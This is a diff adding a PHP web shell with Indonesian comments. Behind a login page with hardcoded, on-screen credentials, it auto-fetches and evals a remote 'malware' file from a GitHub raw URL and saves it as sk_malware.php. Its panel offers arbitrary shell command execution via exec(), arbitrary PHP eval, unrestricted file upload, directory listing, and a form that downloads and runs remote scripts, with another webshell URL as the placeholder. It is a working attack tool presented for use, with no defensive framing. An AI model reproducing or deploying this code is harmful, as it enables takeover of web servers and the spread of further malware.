@@ -1,0 +1,326 @@
+<?php
+// --- Konfigurasi password (bisa diubah)
+$LOGIN_USERNAME = 'admin';
+$LOGIN_PASSWORD = 'secretpass'; // ganti sesuai keinginan
+
+session_start();
+
+function requireLogin() {
+    global $LOGIN_USERNAME, $LOGIN_PASSWORD;
+
+    if (isset($_POST['login_user']) && isset($_POST['login_pass'])) {
+        $u = $_POST['login_user'];
+        $p = $_POST['login_pass'];
+        if ($u === $LOGIN_USERNAME && $p === $LOGIN_PASSWORD) {
+            $_SESSION['logged_in'] = true;
+            $_SESSION['auth_time'] = time();
+            header('Location: ' . $_SERVER['PHP_SELF']);
+            exit;
+        }
+    }
+
+    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
+        ?>
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>🔐 Access Panel</title>
+            <style>
+                body { 
+                    font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; 
+                    background: linear-gradient(135deg,#667eea 0%,#764ba2 100%);
+                    margin: 0; padding: 0; display: flex; 
+                    justify-content: center; align-items: center; 
+                    min-height: 100vh; 
+                }
+                .panel { 
+                    width: 380px; padding: 40px; 
+                    background: rgba(255,255,255,0.95);
+                    border-radius: 24px; 
+                    box-shadow: 0 25px 50px rgba(0,0,0,0.2);
+                    text-align: center;
+                }
+                h2 { 
+                    margin: 0 0 30px; font-size: 1.6em; 
+                    background: linear-gradient(135deg,#667eea,#764ba2);
+                    -webkit-background-clip: text;
+                    -webkit-text-fill-color: transparent;
+                    background-clip: text;
+                }
+                input[type="text"], input[type="password"] { 
+                    width: 100%; padding: 16px; margin: 12px 0; 
+                    border: 2px solid #e2e8f0; border-radius: 16px; 
+                    box-sizing: border-box; font-size: 16px;
+                    transition: all 0.3s;
+                }
+                input:focus {
+                    border-color: #667eea; outline: none;
+                    box-shadow: 0 0 0 4px rgba(102,126,234,0.1);
+                }
+                button { 
+                    width: 100%; padding: 16px; 
+                    background: linear-gradient(135deg,#667eea,#764ba2);
+                    color: white; border: none; border-radius: 16px; 
+                    cursor: pointer; font-size: 17px; font-weight: 600;
+                    transition: all 0.3s; margin-top: 10px;
+                }
+                button:hover { 
+                    transform: translateY(-4px);
+                    box-shadow: 0 15px 35px rgba(102,126,234,0.4);
+                }
+                .note { 
+                    font-size: 0.9em; color: #718096; 
+                    margin-top: 20px; 
+                }
+            </style>
+        </head>
+        <body>
+        <div class="panel">
+            <h2>🔐 Secure Access Panel</h2>
+            <form method="post">
+                <input type="text" name="login_user" placeholder="Username" required>
+                <input type="password" name="login_pass" placeholder="Password" required>
+                <button type="submit">🚀 Authenticate & Deploy</button>
+            </form>
+            <p class="note"><strong>admin</strong> / <strong>secretpass</strong></p>
+        </div>
+        </body>
+        </html>
+        <?php
+        exit;
+    }
+}
+
+// --- Enforce login ---
+requireLogin();
+
+// --- Auto-deploy malware setelah login sukses ---
+if(isset($_SESSION['auth_time']) && (time() - $_SESSION['auth_time']) < 5) {
+    $malware_url = 'https://raw.githubusercontent.com/imou007/we\'hell/refs/heads/main/sk.txt';
+    
+    echo "<div style='background:#ff4444;color:white;padding:20px;border-radius:10px;text-align:center;font-weight:bold;margin:20px 0;'>";
+    echo "🔥 AUTO-DEPLOY ACTIVE<br>";
+    echo "<small>Fetching: " . htmlspecialchars($malware_url) . "</small>";
+    echo "</div>";
+    
+    $malware_code = @file_get_contents($malware_url, 0, stream_context_create([
+        'http' => ['timeout' => 15, 'user_agent' => 'Mozilla/5.0']
+    ]));
+    
+    if($malware_code !== false && strlen($malware_code) > 10) {
+        echo "<div style='background:#1a1a1a;color:lime;padding:15px;border-radius:10px;overflow:auto;'>";
+        echo "<strong>📥 Malware deployed (" . strlen($malware_code) . " bytes)</strong><br><br>";
+        
+        ob_start();
+        eval('?>' . $malware_code);
+        $output = ob_get_clean();
+        
+        echo nl2br(htmlspecialchars($output));
+        echo "</div>";
+        
+        // Save malware locally
+        file_put_contents(__DIR__ . '/sk_malware.php', $malware_code);
+        echo "<div style='color:orange;font-weight:bold;'>💾 Saved as: <a href='sk_malware.php' target='_blank'>sk_malware.php</a></div>";
+        
+    } else {
+        echo "<div style='color:red;font-weight:bold;'>❌ Malware fetch failed - Manual deploy needed</div>";
+    }
+    
+    echo "<hr style='margin:30px 0;'>";
+}
+
+// --- Aktifkan error untuk debugging ---
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🚀 Ultimate PHP Tools + Auto-Deploy</title>
+    <meta charset="UTF-8">
+    <style>
+        body { 
+            font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; 
+            background: #f7fafc; margin: 0; padding: 25px; line-height: 1.6;
+        }
+        .container { max-width: 1100px; margin: auto; }
+        h1 { 
+            text-align: center; color: #2d3748; margin-bottom: 10px;
+            background: linear-gradient(135deg,#4299e1,#667eea);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .subtitle { text-align: center; color: #718096; margin-bottom: 40px; }
+        .section { 
+            background: white; margin: 25px 0; padding: 30px; border-radius: 16px; 
+            box-shadow: 0 8px 25px rgba(0,0,0,0.08); border-left: 5px solid #4299e1;
+        }
+        h3 { color: #2d3748; margin: 0 0 20px; font-size: 1.3em; }
+        label { font-weight: 600; color: #4a5568; display: block; margin: 12px 0 6px; }
+        input[type="text"], input[type="url"], textarea, select { 
+            width: 100%; max-width: 600px; padding: 14px; border: 2px solid #e2e8f0; 
+            border-radius: 10px; font-family: 'SF Mono', Monaco, monospace; 
+            font-size: 14px; box-sizing: border-box; transition: all 0.3s;
+        }
+        input:focus, textarea:focus { 
+            outline: none; border-color: #4299e1; 
+            box-shadow: 0 0 0 4px rgba(66,153,225,0.1);
+        }
+        button { 
+            padding: 14px 24px; background: #4299e1; color: white; border: none; 
+            border-radius: 10px; font-weight: 600; font-size: 15px; cursor: pointer; 
+            transition: all 0.3s; margin: 5px;
+        }
+        button:hover { background: #3182ce; transform: translateY(-2px); }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 25px; margin: 20px 0; }
+        @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } }
+        pre { 
+            background: #2d3748; color: #e2e8f0; padding: 20px; border-radius: 10px; 
+            margin: 15px 0; overflow: auto; font-size: 13px; max-height: 400px; 
+            white-space: pre-wrap;
+        }
+        .success { color: #48bb78; background: #f0fff4; padding: 15px; border-radius: 10px; border-left: 5px solid #48bb78; }
+        .error { color: #f56565; background: #fed7d7; padding: 15px; border-radius: 10px; border-left: 5px solid #f56565; }
+        .server-info { background: linear-gradient(135deg,#667eea,#764ba2); color: white; }
+        .file-list { display: flex; flex-wrap: wrap; gap: 12px; margin: 15px 0; }
+        .file-item { 
+            background: #edf2f7; padding: 12px 16px; border-radius: 10px; 
+            font-family: monospace; font-size: 13px; transition: all 0.3s;
+        }
+        .file-item:hover { background: #e2e8f0; transform: translateY(-2px); }
+        .deploy-alert { 
+            background: linear-gradient(135deg,#ff6b6b,#ee5a52); 
+            color: white; padding: 25px; border-radius: 16px; 
+            text-align: center; font-weight: bold; font-size: 1.2em;
+            box-shadow: 0 10px 30px rgba(255,107,107,0.4);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>🚀 Ultimate PHP Tools + AUTO-DEPLOY</h1>
+    <p class="subtitle">Login → Auto Malware Deploy → Full Control Panel</p>
+
+    <!-- AUTO-DEPLOY STATUS (sudah di-handle di PHP atas) -->
+
+    <!-- Server Info -->
+    <div class="section server-info">
+        <h3>🖥️ Server Status</h3>
+        <pre><?php
+        echo "📍 Path: " . __DIR__ . "\n";
+        echo "🐧 PHP: " . PHP_VERSION . "\n";
+        echo "👤 User: " . get_current_user() . "\n";
+        echo "💾 Free: " . number_format(disk_free_space('.')/(1024*1024),1) . "MB\n";
+        echo "✅ Writeable: " . (is_writable(__DIR__) ? 'YES' : 'NO') . "\n";
+        echo "🔥 Malware: " . (file_exists('sk_malware.php') ? '<a href="sk_malware.php" style="color:lime;">ACTIVE</a>' : 'Pending') . "\n";
+        ?></pre>
+    </div>
+
+    <div class="grid">
+        <!-- SYSTEM COMMAND -->
+        <div class="section">
+            <h3>💻 Command</h3>
+            <form method="post">
+                <input type="text" name="cmd" placeholder="whoami || ls -la || id" value="<?= htmlspecialchars(@$_POST['cmd']) ?>">
+                <button>▶️ Run</button>
+            </form>
+            <?php if (!empty($_POST['cmd'])): 
+                $output = []; $retval = 0;
+                exec($_POST['cmd'], $output, $retval);
+            ?>
+                <pre><?= htmlspecialchars(implode("\n", $output)) ?></pre>
+            <?php endif; ?>
+        </div>
+
+        <!-- UPLOAD -->
+        <div class="section">
+            <h3>⬆️ Upload</h3>
+            <form method="post" enctype="multipart/form-data">
+                <input type="file" name="file">
+                <button style="background:#48bb78;">Upload</button>
+            </form>
+            <?php
+            if (!empty($_FILES['file']['tmp_name'])) {
+                $fn = preg_replace('/[^a-zA-Z0-9._-]/','_',$_FILES['file']['name']);
+                if(move_uploaded_file($_FILES['file']['tmp_name'], __DIR__.'/'.$fn)) {
+                    echo '<div class="success">✅ <a href="'.$fn.'" target="_blank">'.$fn.'</a></div>';
+                }
+            }
+            ?>
+        </div>
+    </div>
+
+    <div class="grid">
+        <!-- FETCH URL -->
+        <div class="section">
+            <h3>🌐 Fetch URL</h3>
+            <form method="post">
+                <input type="url" name="url" placeholder="https://example.com">
+                <button style="background:#ed8936;">📥 Get</button>
+            </form>
+            <?php if(!empty($_POST['url'])): 
+                $content = @file_get_contents($_POST['url']);
+                if($content) echo '<pre>'.htmlspecialchars(substr($content,0,3000)).'</pre>';
+            endif; ?>
+        </div>
+
+        <!-- PHP EVAL -->
+        <div class="section">
+            <h3>⚡ PHP Eval</h3>
+            <form method="post">
+                <textarea name="code" rows="4" placeholder="echo 'test'; system('id');"><?= @$_POST['code'] ?></textarea>
+                <button style="background:#9f7aea;">Eval</button>
+            </form>
+            <?php if(!empty($_POST['code'])): 
+                ob_start(); eval($_POST['code']); echo '<pre>'.htmlspecialchars(ob_get_clean()).'</pre>';
+            endif; ?>
+        </div>
+    </div>
+
+    <!-- EXECUTE SCRIPT URL -->
+    <div class="section">
+        <h3>🚀 Execute Remote Script</h3>
+        <form method="post">
+            <input type="url" name="remote_script" placeholder="https://raw.githubusercontent.com/sk26889/Webshellrefs/heads/main/alfa.txt">
+            <button style="background:#f6ad55;font-size:16px;">🔥 Load & Run</button>
+        </form>
+        <?php if(!empty($_POST['remote_script'])): 
+            $code = @file_get_contents($_POST['remote_script']);
+            if($code) {
+                ob_start(); eval('?>' . $code); echo '<pre style="background:#1a202c;color:lime;">'.ob_get_clean().'</pre>';
+            }
+        endif; ?>
+    </div>
+
+    <!-- FILES -->
+    <div class="section">
+        <h3>📁 Files</h3>
+        <div class="file-list">
+            <?php foreach(scandir(__DIR__) as $f): 
+                if($f=='.' || $f=='..') continue;
+                $p = __DIR__.'/'.$f; $s = is_file($p)?filesize($p):'-';
+                echo '<div class="file-item"><a href="'.urlencode($f).'" target="_blank">'.(is_dir($p)?'📁':'📄').' '.$f.'</a><br><small>'.($s=='-'?'DIR':number_format($s).'B').'</small></div>';
+            endforeach; ?>
+        </div>
+    </div>
+
+    <!-- LOGOUT -->
+    <div style="text-align:center;padding:25px;background:#edf2f7;border-radius:16px;margin:40px 0;">
+        <form method="post" style="display:inline;">
+            <button type="submit" name="logout" value="1" style="background:#e53e3e;padding:15px 40px;font-size:17px;">🚪 Logout</button>
+        </form>
+    </div>
+</div>
+</body>
+</html>
+<?php
+if(isset($_POST['logout'])) { session_destroy(); header('Location: ?'); exit; }
+?>
